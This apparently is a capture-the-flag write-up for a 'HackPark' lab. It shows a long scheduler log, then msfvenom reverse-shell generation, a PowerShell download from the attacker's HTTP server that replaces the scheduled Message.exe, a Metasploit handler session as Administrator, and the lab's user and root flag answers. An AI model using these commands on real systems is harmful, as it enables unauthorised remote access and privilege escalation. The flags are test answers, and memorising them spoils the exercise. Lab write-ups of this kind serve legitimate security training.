08/05/19 14:18:33,Process Ended. PID:1296,ExitCode:4,Message.exe (Administrator)
08/05/19 14:19:00,Event Started Ok, (Administrator)
08/05/19 14:19:33,Process Ended. PID:1884,ExitCode:4,Message.exe (Administrator)
08/05/19 14:20:00,Event Started Ok, (Administrator)
08/05/19 14:20:34,Process Ended. PID:1108,ExitCode:4,Message.exe (Administrator)
08/05/19 14:21:00,Event Started Ok, (Administrator)
08/05/19 14:21:33,Process Ended. PID:1664,ExitCode:4,Message.exe (Administrator)
08/05/19 14:22:00,Event Started Ok, (Administrator)
08/05/19 14:22:34,Process Ended. PID:1748,ExitCode:4,Message.exe (Administrator)
08/05/19 14:23:00,Event Started Ok, (Administrator)
08/05/19 14:23:33,Process Ended. PID:1168,ExitCode:4,Message.exe (Administrator)
08/05/19 14:24:01,Event Started Ok, (Administrator)
08/05/19 14:24:34,Process Ended. PID:1904,ExitCode:4,Message.exe (Administrator)
08/05/19 14:25:00,Event Started Ok, (Administrator)
08/05/19 14:25:33,Process Ended. PID:1296,ExitCode:4,Message.exe (Administrator)
08/05/19 14:26:00,Event Started Ok, (Administrator)
08/05/19 14:26:34,Process Ended. PID:1192,ExitCode:4,Message.exe (Administrator)
08/05/19 14:27:00,Event Started Ok, (Administrator)
08/05/19 14:27:03,Process Ended. PID:96,ExitCode:1,Message.exe (Administrator)
08/05/19 14:28:00,Event Started Ok, (Administrator)
08/05/19 14:28:33,Process Ended. PID:1980,ExitCode:4,Message.exe (Administrator)
08/05/19 14:29:00,Event Started Ok, (Administrator)
08/05/19 14:29:34,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
08/05/19 14:30:00,Event Started Ok, (Administrator)
08/05/19 14:30:33,Process Ended. PID:716,ExitCode:4,Message.exe (Administrator)
08/05/19 14:31:00,Event Started Ok, (Administrator)
08/05/19 14:31:34,Process Ended. PID:1580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:32:00,Event Started Ok, (Administrator)
08/05/19 14:32:33,Process Ended. PID:1740,ExitCode:4,Message.exe (Administrator)
08/05/19 14:33:00,Event Started Ok, (Administrator)
08/05/19 14:33:33,Process Ended. PID:652,ExitCode:4,Message.exe (Administrator)
08/05/19 14:34:00,Event Started Ok, (Administrator)
08/05/19 14:34:33,Process Ended. PID:1580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:35:00,Event Started Ok, (Administrator)
08/05/19 14:35:33,Process Ended. PID:932,ExitCode:4,Message.exe (Administrator)
08/05/19 14:36:00,Event Started Ok, (Administrator)
08/05/19 14:36:33,Process Ended. PID:1520,ExitCode:4,Message.exe (Administrator)
08/05/19 14:37:00,Event Started Ok, (Administrator)
08/05/19 14:37:33,Process Ended. PID:952,ExitCode:4,Message.exe (Administrator)
08/05/19 14:38:00,Event Started Ok, (Administrator)
08/05/19 14:38:33,Process Ended. PID:1960,ExitCode:4,Message.exe (Administrator)
08/05/19 14:39:00,Event Started Ok, (Administrator)
08/05/19 14:39:33,Process Ended. PID:1336,ExitCode:4,Message.exe (Administrator)
08/05/19 14:40:00,Event Started Ok, (Administrator)
08/05/19 14:40:33,Process Ended. PID:1940,ExitCode:4,Message.exe (Administrator)
08/05/19 14:41:00,Event Started Ok, (Administrator)
08/05/19 14:41:33,Process Ended. PID:604,ExitCode:4,Message.exe (Administrator)
08/05/19 14:42:00,Event Started Ok, (Administrator)
08/05/19 14:42:33,Process Ended. PID:204,ExitCode:4,Message.exe (Administrator)
08/06/19 14:12:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
08/06/19 14:13:04,Event Started Ok, (Administrator)
08/06/19 14:13:36,Process Ended. PID:2788,ExitCode:4,Message.exe (Administrator)
08/06/19 14:14:01,Event Started Ok, (Administrator)
08/06/19 14:14:33,Process Ended. PID:2728,ExitCode:4,Message.exe (Administrator)
08/06/19 14:15:01,Event Started Ok, (Administrator)
08/06/19 14:15:34,Process Ended. PID:2776,ExitCode:4,Message.exe (Administrator)
08/06/19 14:16:01,Event Started Ok, (Administrator)
10/02/20 14:13:02,Event Started Ok, (Administrator)
10/02/20 14:13:33,Process Ended. PID:3352,ExitCode:4,Message.exe (Administrator)
10/02/20 14:14:02,Event Started Ok, (Administrator)
10/02/20 14:14:33,Process Ended. PID:3312,ExitCode:4,Message.exe (Administrator)
10/02/20 14:15:00,Event Started Ok, (Administrator)
10/02/20 14:15:24,Process Ended. PID:1944,ExitCode:1,Message.exe (Administrator)
10/02/20 14:16:00,Event Started Ok, (Administrator)
10/02/20 14:16:33,Process Ended. PID:3712,ExitCode:4,Message.exe (Administrator)
10/02/20 14:17:01,Event Started Ok, (Administrator)
10/02/20 14:17:04,Process Ended. PID:3308,ExitCode:1,Message.exe (Administrator)
10/02/20 14:18:02,Event Started Ok, (Administrator)
10/02/20 14:18:34,Process Ended. PID:3896,ExitCode:4,Message.exe (Administrator)
10/02/20 14:19:01,Event Started Ok, (Administrator)
10/02/20 14:19:33,Process Ended. PID:3384,ExitCode:4,Message.exe (Administrator)
10/02/20 14:20:01,Event Started Ok, (Administrator)
10/02/20 14:20:17,Process Ended. PID:3748,ExitCode:1,Message.exe (Administrator)
10/02/20 14:21:02,Event Started Ok, (Administrator)
10/02/20 14:21:34,Process Ended. PID:476,ExitCode:4,Message.exe (Administrator)
10/02/20 14:22:01,Event Started Ok, (Administrator)
10/02/20 14:22:05,Process Ended. PID:904,ExitCode:1,Message.exe (Administrator)
10/02/20 14:23:00,Event Started Ok, (Administrator)
10/02/20 14:23:15,Process Ended. PID:1740,ExitCode:1,Message.exe (Administrator)
10/02/20 14:24:01,Event Started Ok, (Administrator)
10/02/20 14:24:03,Process Ended. PID:2116,ExitCode:1,Message.exe (Administrator)
10/02/20 14:25:00,Event Started Ok, (Administrator)
10/02/20 14:25:03,Process Ended. PID:948,ExitCode:1,Message.exe (Administrator)
10/02/20 14:26:02,Event Started Ok, (Administrator)
10/02/20 14:26:03,Process Ended. PID:3276,ExitCode:1,Message.exe (Administrator)
10/02/20 14:27:01,Event Started Ok, (Administrator)
10/02/20 14:27:04,Process Ended. PID:3892,ExitCode:1,Message.exe (Administrator)
10/02/20 14:28:01,Event Started Ok, (Administrator)
10/02/20 14:28:04,Process Ended. PID:3236,ExitCode:1,Message.exe (Administrator)
10/02/20 14:29:01,Event Started Ok, (Administrator)
10/02/20 14:29:06,Process Ended. PID:3700,ExitCode:1,Message.exe (Administrator)
10/02/20 14:30:01,Event Started Ok, (Administrator)
10/02/20 14:30:04,Process Ended. PID:2280,ExitCode:1,Message.exe (Administrator)
10/02/20 14:32:02,Event Started Ok, (Administrator)
10/02/20 14:32:33,Process Ended. PID:2904,ExitCode:4,Message.exe (Administrator)
10/02/20 14:33:02,Event Started Ok, (Administrator)
10/02/20 14:33:03,Process Ended. PID:3556,ExitCode:1,Message.exe (Administrator)
10/02/20 14:34:02,Event Started Ok, (Administrator)
10/02/20 14:34:03,Process Ended. PID:2596,ExitCode:1,Message.exe (Administrator)
10/02/20 14:35:01,Event Started Ok, (Administrator)
10/02/20 14:35:04,Process Ended. PID:3292,ExitCode:1,Message.exe (Administrator)
10/02/20 14:36:00,Event Started Ok, (Administrator)
10/02/20 14:36:05,Process Ended. PID:2788,ExitCode:1,Message.exe (Administrator)
10/02/20 14:37:01,Event Started Ok, (Administrator)
10/02/20 14:37:33,Process Ended. PID:3196,ExitCode:4,Message.exe (Administrator)
10/02/20 14:38:01,Event Started Ok, (Administrator)
10/02/20 14:38:03,Process Ended. PID:2512,ExitCode:1,Message.exe (Administrator)
10/02/20 14:39:01,Event Started Ok, (Administrator)
10/02/20 14:39:04,Process Ended. PID:2748,ExitCode:1,Message.exe (Administrator)
10/02/20 14:40:01,Event Started Ok, (Administrator)
10/02/20 14:40:04,Process Ended. PID:3584,ExitCode:1,Message.exe (Administrator)
10/02/20 14:41:01,Event Started Ok, (Administrator)
10/02/20 14:41:03,Process Ended. PID:3280,ExitCode:1,Message.exe (Administrator)
10/02/20 14:42:00,Event Started Ok, (Administrator)
10/02/20 14:42:04,Process Ended. PID:2300,ExitCode:1,Message.exe (Administrator)
10/02/20 14:43:01,Event Started Ok, (Administrator)
10/02/20 14:43:08,Process Ended. PID:3452,ExitCode:1,Message.exe (Administrator)
10/02/20 14:44:01,Event Started Ok, (Administrator)
10/02/20 14:44:05,Process Ended. PID:552,ExitCode:1,Message.exe (Administrator)
10/02/20 14:45:01,Event Started Ok, (Administrator)
10/02/20 14:45:33,Process Ended. PID:3972,ExitCode:4,Message.exe (Administrator)
10/02/20 14:46:00,Event Started Ok, (Administrator)
10/02/20 14:46:04,Process Ended. PID:3360,ExitCode:1,Message.exe (Administrator)
10/02/20 14:47:00,Event Started Ok, (Administrator)
10/02/20 14:47:05,Process Ended. PID:3536,ExitCode:1,Message.exe (Administrator)
10/02/20 14:48:00,Event Started Ok, (Administrator)
10/02/20 14:48:03,Process Ended. PID:2956,ExitCode:1,Message.exe (Administrator)
10/02/20 14:51:01,Event Started Ok, (Administrator)
10/02/20 14:51:33,Process Ended. PID:3732,ExitCode:4,Message.exe (Administrator)
10/02/20 14:52:00,Event Started Ok, (Administrator)
10/02/20 14:52:19,Process Ended. PID:4076,ExitCode:1,Message.exe (Administrator)
10/02/20 14:53:01,Event Started Ok, (Administrator)
10/02/20 14:53:31,Process Ended. PID:3728,ExitCode:4,Message.exe (Administrator)
10/02/20 14:54:00,Event Started Ok, (Administrator)
10/02/20 14:54:10,Process Ended. PID:3464,ExitCode:1,Message.exe (Administrator)
10/02/20 14:55:00,Event Started Ok, (Administrator)
10/02/20 14:55:05,Process Ended. PID:3488,ExitCode:1,Message.exe (Administrator)
10/02/20 14:56:01,Event Started Ok, (Administrator)
10/02/20 14:56:33,Process Ended. PID:4040,ExitCode:4,Message.exe (Administrator)
10/02/20 14:57:00,Event Started Ok, (Administrator)
10/02/20 14:57:07,Process Ended. PID:3460,ExitCode:1,Message.exe (Administrator)
10/02/20 14:58:01,Event Started Ok, (Administrator)
10/02/20 14:58:33,Process Ended. PID:3264,ExitCode:4,Message.exe (Administrator)
10/02/20 14:59:00,Event Started Ok, (Administrator)
10/02/20 14:59:34,Process Ended. PID:1244,ExitCode:4,Message.exe (Administrator)
10/02/20 15:00:01,Event Started Ok, (Administrator)
10/02/20 15:00:33,Process Ended. PID:3680,ExitCode:4,Message.exe (Administrator)
10/02/20 15:01:00,Event Started Ok, (Administrator)
10/02/20 15:01:34,Process Ended. PID:3536,ExitCode:4,Message.exe (Administrator)
10/02/20 15:02:01,Event Started Ok, (Administrator)
10/02/20 15:02:33,Process Ended. PID:2044,ExitCode:4,Message.exe (Administrator)
10/02/20 15:03:01,Event Started Ok, (Administrator)
10/02/20 15:03:03,Process Ended. PID:2248,ExitCode:1,Message.exe (Administrator)
10/02/20 15:05:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
10/02/20 15:07:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
10/02/20 15:08:02,Event Started Ok, (Administrator)
10/02/20 15:08:33,Process Ended. PID:2396,ExitCode:4,Message.exe (Administrator)
10/02/20 15:09:00,Event Started Ok, (Administrator)
10/02/20 15:09:33,Process Ended. PID:2636,ExitCode:4,Message.exe (Administrator)
10/02/20 15:10:00,Event Started Ok, (Administrator)
10/02/20 15:10:07,Process Ended. PID:1760,ExitCode:1,Message.exe (Administrator)
09/27/22 09:49:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
09/27/22 09:50:01,Event Started Ok, (Administrator)
09/27/22 09:50:33,Process Ended. PID:2764,ExitCode:4,Message.exe (Administrator)
09/27/22 09:51:01,Event Started Ok, (Administrator)
09/27/22 09:51:33,Process Ended. PID:648,ExitCode:4,Message.exe (Administrator)
09/27/22 09:52:01,Event Started Ok, (Administrator)
09/27/22 09:52:33,Process Ended. PID:2744,ExitCode:4,Message.exe (Administrator)
09/27/22 09:53:01,Event Started Ok, (Administrator)
09/27/22 09:53:33,Process Ended. PID:2792,ExitCode:4,Message.exe (Administrator)
09/27/22 09:54:00,Event Started Ok, (Administrator)
09/27/22 09:54:34,Process Ended. PID:384,ExitCode:4,Message.exe (Administrator)
09/27/22 09:55:01,Event Started Ok, (Administrator)
09/27/22 09:55:33,Process Ended. PID:720,ExitCode:4,Message.exe (Administrator)
09/27/22 09:56:01,Event Started Ok, (Administrator)
09/27/22 09:56:33,Process Ended. PID:2936,ExitCode:4,Message.exe (Administrator)
09/27/22 09:57:01,Event Started Ok, (Administrator)
09/27/22 09:57:33,Process Ended. PID:1336,ExitCode:4,Message.exe (Administrator)
09/27/22 09:58:02,Event Started Ok, (Administrator)
09/27/22 09:58:34,Process Ended. PID:2720,ExitCode:4,Message.exe (Administrator)
09/27/22 09:59:01,Event Started Ok, (Administrator)
09/27/22 09:59:34,Process Ended. PID:1952,ExitCode:4,Message.exe (Administrator)
09/27/22 10:00:01,Event Started Ok, (Administrator)
09/27/22 10:00:33,Process Ended. PID:1852,ExitCode:4,Message.exe (Administrator)
09/27/22 10:01:01,Event Started Ok, (Administrator)
09/27/22 10:01:33,Process Ended. PID:2944,ExitCode:4,Message.exe (Administrator)
09/27/22 10:02:02,Event Started Ok, (Administrator)
09/27/22 10:02:34,Process Ended. PID:2336,ExitCode:4,Message.exe (Administrator)
09/27/22 10:03:01,Event Started Ok, (Administrator)
09/27/22 10:03:34,Process Ended. PID:3048,ExitCode:4,Message.exe (Administrator)
09/27/22 10:04:01,Event Started Ok, (Administrator)
09/27/22 10:04:33,Process Ended. PID:1704,ExitCode:4,Message.exe (Administrator)
09/27/22 10:05:01,Event Started Ok, (Administrator)
09/27/22 10:05:33,Process Ended. PID:1944,ExitCode:4,Message.exe (Administrator)
09/27/22 10:06:01,Event Started Ok, (Administrator)
09/27/22 10:06:33,Process Ended. PID:2608,ExitCode:4,Message.exe (Administrator)
09/27/22 10:07:02,Event Started Ok, (Administrator)
09/27/22 10:07:34,Process Ended. PID:2956,ExitCode:4,Message.exe (Administrator)
09/27/22 10:08:01,Event Started Ok, (Administrator)
09/27/22 10:08:34,Process Ended. PID:2776,ExitCode:4,Message.exe (Administrator)
09/27/22 10:09:01,Event Started Ok, (Administrator)
09/27/22 10:09:33,Process Ended. PID:484,ExitCode:4,Message.exe (Administrator)
09/27/22 10:10:01,Event Started Ok, (Administrator)
09/27/22 10:10:33,Process Ended. PID:908,ExitCode:4,Message.exe (Administrator)
09/27/22 10:11:01,Event Started Ok, (Administrator)
09/27/22 10:11:33,Process Ended. PID:2760,ExitCode:4,Message.exe (Administrator)
09/27/22 10:12:02,Event Started Ok, (Administrator)
09/27/22 10:12:34,Process Ended. PID:1968,ExitCode:4,Message.exe (Administrator)
09/27/22 10:13:01,Event Started Ok, (Administrator)
09/27/22 10:13:34,Process Ended. PID:3004,ExitCode:4,Message.exe (Administrator)
09/27/22 10:14:01,Event Started Ok, (Administrator)
09/27/22 10:14:34,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
09/27/22 10:15:01,Event Started Ok, (Administrator)
09/27/22 10:15:33,Process Ended. PID:2508,ExitCode:4,Message.exe (Administrator)
09/27/22 10:16:01,Event Started Ok, (Administrator)
09/27/22 10:16:33,Process Ended. PID:1872,ExitCode:4,Message.exe (Administrator)
09/27/22 10:17:01,Event Started Ok, (Administrator)
09/27/22 10:17:34,Process Ended. PID:2836,ExitCode:4,Message.exe (Administrator)
09/27/22 10:18:01,Event Started Ok, (Administrator)
09/27/22 10:18:34,Process Ended. PID:2224,ExitCode:4,Message.exe (Administrator)
09/27/22 10:19:01,Event Started Ok, (Administrator)
09/27/22 10:19:33,Process Ended. PID:2384,ExitCode:4,Message.exe (Administrator)
09/27/22 10:20:01,Event Started Ok, (Administrator)
09/27/22 10:20:33,Process Ended. PID:2752,ExitCode:4,Message.exe (Administrator)
09/27/22 10:21:01,Event Started Ok, (Administrator)
09/27/22 10:21:33,Process Ended. PID:2744,ExitCode:4,Message.exe (Administrator)
09/27/22 10:22:02,Event Started Ok, (Administrator)
09/27/22 10:22:34,Process Ended. PID:644,ExitCode:4,Message.exe (Administrator)
09/27/22 10:23:01,Event Started Ok, (Administrator)
09/27/22 10:23:34,Process Ended. PID:2204,ExitCode:4,Message.exe (Administrator)
09/27/22 10:24:01,Event Started Ok, (Administrator)
09/27/22 10:24:33,Process Ended. PID:1696,ExitCode:4,Message.exe (Administrator)
09/27/22 10:25:01,Event Started Ok, (Administrator)
09/27/22 10:25:33,Process Ended. PID:1780,ExitCode:4,Message.exe (Administrator)
09/27/22 10:26:01,Event Started Ok, (Administrator)
09/27/22 10:26:33,Process Ended. PID:2232,ExitCode:4,Message.exe (Administrator)
09/27/22 10:27:02,Event Started Ok, (Administrator)
09/27/22 10:27:34,Process Ended. PID:2796,ExitCode:4,Message.exe (Administrator)
09/27/22 10:28:00,Event Started Ok, (Administrator)
09/27/22 10:28:34,Process Ended. PID:1704,ExitCode:4,Message.exe (Administrator)
09/27/22 10:29:01,Event Started Ok, (Administrator)
09/27/22 10:29:33,Process Ended. PID:768,ExitCode:4,Message.exe (Administrator)
09/27/22 10:30:01,Event Started Ok, (Administrator)
09/27/22 10:30:33,Process Ended. PID:3036,ExitCode:4,Message.exe (Administrator)
09/27/22 10:31:01,Event Started Ok, (Administrator)
09/27/22 10:31:33,Process Ended. PID:2720,ExitCode:4,Message.exe (Administrator)
09/27/22 10:32:02,Event Started Ok, (Administrator)
09/27/22 10:32:34,Process Ended. PID:844,ExitCode:4,Message.exe (Administrator)
09/27/22 10:33:00,Event Started Ok, (Administrator)
09/27/22 10:33:34,Process Ended. PID:984,ExitCode:4,Message.exe (Administrator)
09/27/22 10:34:00,Event Started Ok, (Administrator)
09/27/22 10:34:33,Process Ended. PID:768,ExitCode:4,Message.exe (Administrator)
09/27/22 10:35:01,Event Started Ok, (Administrator)
09/27/22 10:35:33,Process Ended. PID:3004,ExitCode:4,Message.exe (Administrator)
09/27/22 10:36:01,Event Started Ok, (Administrator)
09/27/22 10:36:33,Process Ended. PID:1832,ExitCode:4,Message.exe (Administrator)
09/27/22 10:37:02,Event Started Ok, (Administrator)
09/27/22 10:37:34,Process Ended. PID:1336,ExitCode:4,Message.exe (Administrator)
09/27/22 10:38:01,Event Started Ok, (Administrator)
09/27/22 10:38:34,Process Ended. PID:484,ExitCode:4,Message.exe (Administrator)
09/27/22 10:39:01,Event Started Ok, (Administrator)
09/27/22 10:39:33,Process Ended. PID:2816,ExitCode:4,Message.exe (Administrator)
09/27/22 10:40:00,Event Started Ok, (Administrator)
09/27/22 10:40:33,Process Ended. PID:1288,ExitCode:4,Message.exe (Administrator)
09/27/22 10:41:01,Event Started Ok, (Administrator)
09/27/22 10:41:33,Process Ended. PID:2864,ExitCode:4,Message.exe (Administrator)
09/27/22 10:42:02,Event Started Ok, (Administrator)
09/27/22 10:42:34,Process Ended. PID:2412,ExitCode:4,Message.exe (Administrator)
09/27/22 10:43:01,Event Started Ok, (Administrator)
09/27/22 10:43:34,Process Ended. PID:1904,ExitCode:4,Message.exe (Administrator)
09/27/22 10:44:01,Event Started Ok, (Administrator)
09/27/22 10:44:33,Process Ended. PID:1280,ExitCode:4,Message.exe (Administrator)
09/27/22 10:45:01,Event Started Ok, (Administrator)
09/27/22 10:45:33,Process Ended. PID:1780,ExitCode:4,Message.exe (Administrator)
09/27/22 10:46:01,Event Started Ok, (Administrator)
09/27/22 10:46:33,Process Ended. PID:2320,ExitCode:4,Message.exe (Administrator)
09/27/22 10:47:02,Event Started Ok, (Administrator)
09/27/22 10:47:34,Process Ended. PID:2120,ExitCode:4,Message.exe (Administrator)
09/27/22 10:48:01,Event Started Ok, (Administrator)
09/27/22 10:48:34,Process Ended. PID:1208,ExitCode:4,Message.exe (Administrator)
09/27/22 10:49:01,Event Started Ok, (Administrator)
09/27/22 10:49:33,Process Ended. PID:2436,ExitCode:4,Message.exe (Administrator)
09/27/22 10:50:01,Event Started Ok, (Administrator)
09/27/22 10:50:33,Process Ended. PID:2452,ExitCode:4,Message.exe (Administrator)
09/27/22 10:51:01,Event Started Ok, (Administrator)
09/27/22 10:51:33,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
09/27/22 10:52:00,Event Started Ok, (Administrator)
09/27/22 10:52:34,Process Ended. PID:2692,ExitCode:4,Message.exe (Administrator)
09/27/22 10:53:01,Event Started Ok, (Administrator)
09/27/22 10:53:34,Process Ended. PID:1456,ExitCode:4,Message.exe (Administrator)
09/27/22 10:54:01,Event Started Ok, (Administrator)
09/27/22 10:54:34,Process Ended. PID:2904,ExitCode:4,Message.exe (Administrator)
09/27/22 10:55:01,Event Started Ok, (Administrator)
09/27/22 10:55:33,Process Ended. PID:2448,ExitCode:4,Message.exe (Administrator)
09/27/22 10:56:01,Event Started Ok, (Administrator)
09/27/22 10:56:33,Process Ended. PID:3004,ExitCode:4,Message.exe (Administrator)
09/27/22 10:57:01,Event Started Ok, (Administrator)
09/27/22 10:57:33,Process Ended. PID:1180,ExitCode:4,Message.exe (Administrator)
09/27/22 10:58:02,Event Started Ok, (Administrator)
09/27/22 10:58:34,Process Ended. PID:1456,ExitCode:4,Message.exe (Administrator)
09/27/22 10:59:01,Event Started Ok, (Administrator)
09/27/22 10:59:33,Process Ended. PID:1948,ExitCode:4,Message.exe (Administrator)
09/27/22 11:00:01,Event Started Ok, (Administrator)
09/27/22 11:00:33,Process Ended. PID:2956,ExitCode:4,Message.exe (Administrator)
09/27/22 11:01:01,Event Started Ok, (Administrator)
09/27/22 11:01:33,Process Ended. PID:1624,ExitCode:4,Message.exe (Administrator)
09/27/22 11:02:01,Event Started Ok, (Administrator)
09/27/22 11:02:33,Process Ended. PID:2508,ExitCode:4,Message.exe (Administrator)
09/27/22 11:03:02,Event Started Ok, (Administrator)
09/27/22 11:03:34,Process Ended. PID:2864,ExitCode:4,Message.exe (Administrator)
09/27/22 11:04:01,Event Started Ok, (Administrator)
09/27/22 11:04:34,Process Ended. PID:480,ExitCode:4,Message.exe (Administrator)
09/27/22 11:05:01,Event Started Ok, (Administrator)
09/27/22 11:05:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
09/27/22 11:06:01,Event Started Ok, (Administrator)
09/27/22 11:06:33,Process Ended. PID:1904,ExitCode:4,Message.exe (Administrator)
09/27/22 11:07:01,Event Started Ok, (Administrator)
09/27/22 11:07:33,Process Ended. PID:2336,ExitCode:4,Message.exe (Administrator)
09/27/22 11:08:01,Event Started Ok, (Administrator)

```


What is the name of the binary you're supposed to exploit? 
 have you checked for logs for the abnormal service?
*Message.exe*



```
meterpreter > cd "c:\users"
meterpreter > ls
Listing: c:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2019-08-03 14:15:04 -0400  .NET v4.5
040777/rwxrwxrwx  8192  dir   2019-08-03 14:15:04 -0400  .NET v4.5 Classic
040777/rwxrwxrwx  8192  dir   2019-08-05 17:03:44 -0400  Administrator
040777/rwxrwxrwx  0     dir   2013-08-22 10:48:41 -0400  All Users
040555/r-xr-xr-x  8192  dir   2014-03-21 15:16:56 -0400  Default
040777/rwxrwxrwx  0     dir   2013-08-22 10:48:41 -0400  Default User
040555/r-xr-xr-x  4096  dir   2013-08-22 11:39:32 -0400  Public
100666/rw-rw-rw-  174   fil   2013-08-22 11:37:57 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2019-08-04 14:54:53 -0400  jeff

meterpreter > cd jeff
[-] stdapi_fs_chdir: Operation failed: Access is denied.

Time to replace C:\Program Files (x86)\SystemScheduler\Message.exe with a reverse shell. Let’s first generate a new reverse shell (use a new port) that we will name Message.exe: 


stop this meterpreter in order to work then create a new one to get admin priv


┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.220 LPORT=3456 -f exe -o Message.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: Message.exe
                                                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.97.210 - - [27/Sep/2022 14:15:18] "GET /Message.exe HTTP/1.1" 200 -
10.10.97.210 - - [27/Sep/2022 14:17:03] "GET /Message.exe HTTP/1.1" 200 -
10.10.97.210 - - [27/Sep/2022 14:26:48] "GET /Message.exe HTTP/1.1" 200 -

c:\Windows\Temp>cd "C:\Program Files (x86)\SystemScheduler
ls
C:\Program Files (x86)\SystemScheduler>ls
dir
C:\Program Files (x86)\SystemScheduler>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Program Files (x86)\SystemScheduler
08/04/2019  04:37 AM    <DIR>          .
08/04/2019  04:37 AM    <DIR>          ..
05/17/2007  01:47 PM             1,150 alarmclock.ico
08/31/2003  12:06 PM               766 clock.ico
08/31/2003  12:06 PM            80,856 ding.wav
09/27/2022  11:19 AM    <DIR>          Events
08/04/2019  04:36 AM                60 Forum.url
01/08/2009  08:21 PM         1,637,972 libeay32.dll
11/16/2004  12:16 AM             9,813 License.txt
09/27/2022  09:48 AM             1,496 LogFile.txt
09/27/2022  09:49 AM             3,760 LogfileAdvanced.txt
03/25/2018  10:58 AM           536,992 Message.exe
03/25/2018  10:59 AM           445,344 PlaySound.exe
03/25/2018  10:58 AM            27,040 PlayWAV.exe
08/04/2019  03:05 PM               149 Preferences.ini
03/25/2018  10:58 AM           485,792 Privilege.exe
03/24/2018  12:09 PM            10,100 ReadMe.txt
03/25/2018  10:58 AM           112,544 RunNow.exe
03/25/2018  10:59 AM            40,352 sc32.exe
08/31/2003  12:06 PM               766 schedule.ico
03/25/2018  10:58 AM         1,633,696 Scheduler.exe
03/25/2018  10:59 AM           491,936 SendKeysHelper.exe
03/25/2018  10:58 AM           437,664 ShowXY.exe
03/25/2018  10:58 AM           439,712 ShutdownGUI.exe
03/25/2018  10:58 AM           235,936 SSAdmin.exe
03/25/2018  10:58 AM           731,552 SSCmd.exe
01/08/2009  08:12 PM           355,446 ssleay32.dll
03/25/2018  10:58 AM           456,608 SSMail.exe
08/04/2019  04:36 AM             6,999 unins000.dat
08/04/2019  04:36 AM           722,597 unins000.exe
08/04/2019  04:36 AM                54 Website.url
06/26/2009  05:27 PM             6,574 whiteclock.ico
03/25/2018  10:58 AM            76,704 WhoAmI.exe
05/16/2006  04:49 PM           785,042 WSCHEDULER.CHM
05/16/2006  03:58 PM             2,026 WScheduler.cnt
03/25/2018  10:58 AM           331,168 WScheduler.exe
05/16/2006  04:58 PM           703,081 WSCHEDULER.HLP
03/25/2018  10:58 AM           136,096 WSCtrl.exe
03/25/2018  10:58 AM            98,720 WService.exe
03/25/2018  10:58 AM            68,512 WSLogon.exe
03/25/2018  10:59 AM            33,184 WSProc.dll
              38 File(s)     11,148,259 bytes
               3 Dir(s)  39,125,901,312 bytes free
.\Message.exe
C:\Program Files (x86)\SystemScheduler>.\Message.exe
powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
.\Message.exe


┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
msf6 exploit(multi/handler) > set LPORT 3456
LPORT => 3456
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:3456 
[*] Sending stage (175686 bytes) to 10.10.97.210
[*] Meterpreter session 1 opened (10.11.81.220:3456 -> 10.10.97.210:49328) at 2022-09-27 14:27:05 -0400

meterpreter > getuid
Server username: HACKPARK\Administrator
meterpreter > cd c:\users\jeff\desktop\
 > ls
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd "C:\Users\jeff\Desktop\"
[-] Parse error: Unmatched quote: "cd \"C:\\Users\\jeff\\Desktop\\\""
meterpreter > cd 'C:\Users\jeff\Desktop\'
meterpreter > ls
Listing: C:\Users\jeff\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-08-04 14:54:53 -0400  desktop.ini
100666/rw-rw-rw-  32    fil   2019-08-04 14:57:10 -0400  user.txt

meterpreter > cat user.txt
759bd8af507517bcfaede78a21a73e39
meterpreter > cd 'C:\Users\Administrator\Desktop\'
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1029  fil   2019-08-04 07:36:42 -0400  System Scheduler.lnk
100666/rw-rw-rw-  282   fil   2019-08-03 13:43:54 -0400  desktop.ini
100666/rw-rw-rw-  32    fil   2019-08-04 14:51:42 -0400  root.txt

meterpreter > cat root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72




```


Using this abnormal service, escalate your privileges!

What is the user flag (on Jeffs Desktop)?
 Check exploit-db.com for a public writeup of this vulnerability. The missing binary isn't the same as the public exploit.

*759bd8af507517bcfaede78a21a73e39*


What is the root flag?
*7e13d97f05f7ceb9881a3eb3d78d3e72*

### Privilege Escalation Without Metasploit 

![](https://i.imgur.com/yYRoCAf.png)

